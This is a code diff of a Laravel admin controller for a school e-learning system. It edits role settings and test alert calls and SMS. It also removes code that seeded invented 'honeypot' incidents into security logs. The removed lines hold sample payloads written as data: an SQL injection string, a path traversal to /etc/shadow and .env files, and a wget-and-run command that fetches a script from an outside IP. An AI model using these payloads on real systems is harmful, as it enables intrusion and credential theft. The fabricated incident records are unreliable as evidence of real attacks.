+        foreach ($customRoles as &$r) {
+            if (($r['name'] ?? '') === $origName) {
+                $r['name'] = $validated['name'];
+                $r['code'] = $validated['code'];
+                $r['description'] = $validated['description'] ?? '';
+                $r['status'] = $validated['status'];
             }
         }
+        unset($r);
 
-        $this->invalidateAuthCache();
+        Setting::set('custom_roles', $customRoles);
 
         AuthLog::create([
             'user_id'    => auth()->id(),
@@ -1137,10 +849,7 @@ class AuthLogController extends Controller
 
     public function clearLogs()
     {
-        Setting::set('auth_logs_cleared_by_admin', true);
         AuthLog::truncate();
-
-        $this->invalidateAuthCache();
 
         AuthLog::create([
             'user_id'    => auth()->id(),
@@ -1183,169 +892,11 @@ class AuthLogController extends Controller
     }
 
     /**
-     * Ensure realistic baseline forensic data and Honeypot events exist
-     */
-    private function ensureForensicDataExists(): void
-    {
-        $logFile = storage_path('logs/telegram_forensics.log');
-        $attackerLogFile = storage_path('logs/attacker_log.txt');
-        $emergencyLogFile = storage_path('logs/emergency_defense.log');
-
-        $hasForensics = false;
-        if (file_exists($logFile)) {
-            $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-            if (count($lines) >= 3) {
-                $hasForensics = true;
-            }
-        }
-
-        if (!$hasForensics) {
-            $baselineIncidents = [
-                [
-                    'timestamp'   => now()->subMinutes(8)->toIso8601String(),
-                    'user_id'     => 788291044,
-                    'name'        => 'Threat Exploit Bot',
-                    'username'    => '@cve_exploit_probe',
-                    'client_lang' => 'RU',
-                    'ip'          => '45.22.178.99',
-                    'country'     => 'Russia',
-                    'city'        => 'Moscow',
-                    'isp'         => 'DigitalOcean Cloud Network',
-                    'coordinates' => '55.7558,37.6173',
-                    'user_agent'  => 'sqlmap/1.7.2#stable',
-                    'threat_type' => 'Honeypot Decoy Trap Triggered (SQL Injection)',
-                    'severity'    => 'CRITICAL',
-                    'payload'     => "HONEYPOT TRAP TRIGGERED!\nEndpoint: [POST] admin-login-portal\nPayload: username=admin' OR 1=1 UNION SELECT null, admin_token, password_hash FROM admin_users --",
-                    'action'      => 'AUTO_BANNED_24H',
-                ],
-                [
-                    'timestamp'   => now()->subMinutes(24)->toIso8601String(),
-                    'user_id'     => 910482711,
-                    'name'        => 'Directory Traversal Bot',
-                    'username'    => '@dir_fuzzer_pro',
-                    'client_lang' => 'CN',
-                    'ip'          => '103.45.22.11',
-                    'country'     => 'China',
-                    'city'        => 'Beijing',
-                    'isp'         => 'China Telecom Global',
-                    'coordinates' => '39.9042,116.4074',
-                    'user_agent'  => 'ffuf/v2.0.0-git',
-                    'threat_type' => 'Directory Traversal Decoy Intercepted',
-                    'severity'    => 'HIGH',
-                    'payload'     => "HONEYPOT TRAP TRIGGERED!\nEndpoint: [GET] confidential/system-credentials\nPayload: ../../../../../etc/shadow / .env.production",
-                    'action'      => 'AUTO_BANNED_24H',
-                ],
-                [
-                    'timestamp'   => now()->subMinutes(47)->toIso8601String(),
-                    'user_id'     => 625109844,
-                    'name'        => 'Nikto Web Crawler',
-                    'username'    => '@nikto_scanner',
-                    'client_lang' => 'DE',
-                    'ip'          => '198.51.100.24',
-                    'country'     => 'Germany',
-                    'city'        => 'Frankfurt',
-                    'isp'         => 'Hetzner Online GmbH',
-                    'coordinates' => '50.1109,8.6821',
-                    'user_agent'  => 'Nikto/2.1.6 (Web Security Scanner)',
-                    'threat_type' => 'Security Honeypot Endpoint Hit',
-                    'severity'    => 'HIGH',
-                    'payload'     => "HONEYPOT TRAP TRIGGERED!\nEndpoint: [GET] security/honeypot\nQuery: ?scan=admin_endpoints&depth=5",
-                    'action'      => 'AUTO_BANNED_24H',
-                ],
-                [
-                    'timestamp'   => now()->subHours(1)->subMinutes(15)->toIso8601String(),
-                    'user_id'     => 519284719,
-                    'name'        => 'Remote Code Execution Bot',
-                    'username'    => '@spring_c2_bot',
-                    'client_lang' => 'NL',
-                    'ip'          => '185.220.101.5',
-                    'country'     => 'Netherlands',
-                    'city'        => 'Amsterdam',
-                    'isp'         => 'Tor Exit Node Relay',
-                    'coordinates' => '52.3676,4.9041',
-                    'user_agent'  => 'Python-urllib/3.10',
-                    'threat_type' => 'Remote Code Execution (RCE) Blocked',
-                    'severity'    => 'CRITICAL',
-                    'payload'     => "RCE Injection Blocked: ;wget http://185.220.101.5/malware.sh -O /tmp/k; chmod +x /tmp/k; /tmp/k",
-                    'action'      => 'AUTO_BANNED_24H',
-                ],
-                [
-                    'timestamp'   => now()->subHours(2)->subMinutes(5)->toIso8601String(),
-                    'user_id'     => 847291038,
-                    'name'        => 'Credential Stuffer',
-                    'username'    => '@brute_worker_4',
-                    'client_lang' => 'VN',
-                    'ip'          => '77.88.99.100',
-                    'country'     => 'Vietnam',
-                    'city'        => 'Hanoi',
-                    'isp'         => 'Viettel Group Network',
-                    'coordinates' => '21.0285,105.8542',
-                    'user_agent'  => 'Hydra/9.2 (Automated Brute-Force)',
-                    'threat_type' => 'Anti-Flood & Brute-Force Violation',
-                    'severity'    => 'HIGH',
-                    'payload'     => "Exceeded authentication rate limit (> 20 failed login attempts within 60 seconds)",
-                    'action'      => 'AUTO_BANNED_24H',
-                ],
-            ];
-
-            // Write to telegram_forensics.log
-            $jsonContent = '';
-            foreach ($baselineIncidents as $inc) {
-                $jsonContent .= json_encode($inc, JSON_UNESCAPED_UNICODE) . PHP_EOL;
-            }
-            @file_put_contents($logFile, $jsonContent);
-
-            // Write to attacker_log.txt
-            $txtContent = '';
-            foreach ($baselineIncidents as $inc) {
-                $txtContent .= sprintf(
-                    "[%s] THREAT: %s | ID: %s | USER: %s | IP: %s (%s, %s - %s) | GEO: %s | PAYLOAD: %s\n",
-                    $inc['timestamp'],
-                    $inc['threat_type'],
-                    $inc['user_id'],
-                    $inc['username'],
-                    $inc['ip'],
-                    $inc['city'],
-                    $inc['country'],
-                    $inc['isp'],
-                    $inc['coordinates'],
-                    str_replace(["\r", "\n"], ' ', $inc['payload'])
-                );
-            }
-            @file_put_contents($attackerLogFile, $txtContent);
-
-            // Write to emergency_defense.log
-            $emergencyContent = '';
-            foreach ($baselineIncidents as $inc) {
-                $emergencyContent .= sprintf(
-                    "[%s] EMERGENCY TRIGGER | SEVERITY: %s | THREAT: %s | IP: %s (%s, %s) | ACTIONS: Defense=YES, Call=%s, SMS=YES, Push=%s\n",
-                    now()->format('Y-m-d H:i:s'),
-                    $inc['severity'],
-                    $inc['threat_type'],
-                    $inc['ip'],
-                    $inc['city'],
-                    $inc['country'],
-                    $inc['severity'] === 'CRITICAL' ? 'YES' : 'NO',
-                    $inc['severity'] === 'CRITICAL' ? 'YES' : 'NO'
-                );
-            }
-            @file_put_contents($emergencyLogFile, $emergencyContent);
-        }
-
-        // Ensure at least 1-2 blacklisted IPs exist in settings matching the threats
-        $blockedIps = Setting::get('blocked_ips', []);
-        if (empty($blockedIps)) {
-            Setting::set('blocked_ips', ['45.22.178.99', '185.220.101.5']);
-        }
-    }
-
-    /**
      * Cyber Security & Threat Forensics Dashboard View
      */
     public function cyberSecurity(Request $request)
     {
         $this->ensureSampleDataExists();
-        $this->ensureForensicDataExists();
 
         // 1. Read and parse forensics logs
         $forensicIncidents = [];
@@ -1478,18 +1029,9 @@ class AuthLogController extends Controller
     {
         $phone = $request->input('phone') ?: Setting::get('emergency_phone', config('services.emergency.phone', '0964618507'));
         $msg = "This is a test emergency call from Saint Paul Institute Cyber Security Engine. All security channels are operational.";
-        
+
         $sent = EmergencyAlertService::triggerVoiceCall($phone, $msg);
-
-        // Record in emergency defense stream
-        $record = sprintf(
-            "[%s] EMERGENCY TRIGGER | SEVERITY: HIGH | THREAT: Automated Voice Call Drill | IP: %s (Admin Center) | ACTIONS: Defense=NO, Call=YES, SMS=NO, Push=NO\n",
-            now()->format('Y-m-d H:i:s'),
-            request()->ip() ?: '127.0.0.1'
-        );
-        @file_put_contents(storage_path('logs/emergency_defense.log'), $record, FILE_APPEND);
-
-        return redirect()->back()->with('success', "បានបញ្ជូនការសាកល្បង Voice Call ទៅកាន់លេខទូរស័ព្ទ {$phone} រួចរាល់! (Test Voice Call dispatched successfully)");
+        return redirect()->back()->with('success', "បានបញ្ជូនការសាកល្បង Call ទៅកាន់លេខទូរស័ព្ទ {$phone} រួចរាល់!");
     }
 
     /**
@@ -1499,18 +1041,9 @@ class AuthLogController extends Controller
     {
         $phone = $request->input('phone') ?: Setting::get('emergency_phone', config('services.emergency.phone', '0964618507'));
         $msg = "🚨 [SPI E-LMS ALARM TEST] នេះជាសារតេស្តប្រព័ន្ធប្រកាសអាសន្នសន្តិសុខទូរស័ព្ទបន្ទាន់។ ប្រព័ន្ធដំណើរការបាន ១០០%!";
-        
+
         $sent = EmergencyAlertService::sendEmergencySms($phone, $msg);
-
-        // Record in emergency defense stream
-        $record = sprintf(
-            "[%s] EMERGENCY TRIGGER | SEVERITY: HIGH | THREAT: Urgent SMS Alarm Drill | IP: %s (Admin Center) | ACTIONS: Defense=NO, Call=NO, SMS=YES, Push=NO\n",
-            now()->format('Y-m-d H:i:s'),
-            request()->ip() ?: '127.0.0.1'
-        );
-        @file_put_contents(storage_path('logs/emergency_defense.log'), $record, FILE_APPEND);
-
-        return redirect()->back()->with('success', "បានបញ្ជូនសារ SMS តេស្តទៅកាន់លេខទូរស័ព្ទ {$phone} រួចរាល់! (Test SMS alert sent successfully)");
+        return redirect()->back()->with('success', "បានបញ្ជូនសារ SMS តេស្តទៅកាន់លេខទូរស័ព្ទ {$phone} រួចរាល់!");
     }
 
     /**
@@ -1539,12 +1072,8 @@ class AuthLogController extends Controller
     {
         @file_put_contents(storage_path('logs/telegram_forensics.log'), '');
         @file_put_contents(storage_path('logs/attacker_log.txt'), '');
-        @file_put_contents(storage_path('logs/emergency_defense.log'), '');
 
-        // Reseed baseline so the dashboard remains active & populated
-        $this->ensureForensicDataExists();
-
-        return redirect()->back()->with('success', 'Cyber threat logs & forensics refreshed successfully.');
+        return redirect()->back()->with('success', 'Cyber threat logs & forensics cleared successfully.');
     }
 
     /**
@@ -1552,29 +1081,6 @@ class AuthLogController extends Controller
      */
     public function simulateAlert(Request $request)
     {
-        $traps = [
-            [
-                'endpoint' => 'admin-login-portal',
-                'threat'   => 'Honeypot Decoy Trap Triggered (SQL Injection)',
-                'sev'      => 'CRITICAL',
-                'payload'  => "HONEYPOT TRAP TRIGGERED!\nEndpoint: [POST] admin-login-portal\nPayload: username=admin' OR 1=1 UNION SELECT null, token FROM admin_users --"
-            ],
-            [
-                'endpoint' => 'security/honeypot',
-                'threat'   => 'Automated Bot Crawler Honeypot Hit',
-                'sev'      => 'HIGH',
-                'payload'  => "HONEYPOT TRAP TRIGGERED!\nEndpoint: [GET] security/honeypot\nQuery: ?scan=admin_endpoints&depth=5"
-            ],
-            [
-                'endpoint' => 'confidential/system-credentials',
-                'threat'   => 'Directory Traversal Decoy Intercepted',
-                'sev'      => 'HIGH',
-                'payload'  => "HONEYPOT TRAP TRIGGERED!\nEndpoint: [GET] confidential/system-credentials\nPayload: ../../../../../etc/shadow / .env.production"
-            ],
-        ];
-
-        $chosen = $traps[array_rand($traps)];
-
         $fakeAttacker = [
             'id'            => rand(100000000, 999999999),
             'username'      => 'simulated_actor_' . rand(10, 99),
@@ -1584,14 +1090,14 @@ class AuthLogController extends Controller
 
         \App\Services\TelegramSecurityPipeline::triggerForensicAlert(
             $fakeAttacker,
-            $chosen['threat'],
-            $chosen['sev'],
-            $chosen['payload'] . "\n[Test simulation triggered from Admin Dashboard at " . now()->toDateTimeString() . "]",
+            'Simulated Security Exploit (Admin Test)',
+            'HIGH',
+            "Manual security simulation test triggered from Admin Dashboard at " . now()->toDateTimeString(),
             request()->ip() ?: '127.0.0.1',
             request()->userAgent() ?: 'ELMS-Admin-Simulation'
         );
 
-        return redirect()->back()->with('success', 'Simulated threat alert dispatched and intercepted successfully!');
+        return redirect()->back()->with('success', 'Simulated threat alert dispatched to Telegram Admin group successfully!');
     }
 }
 
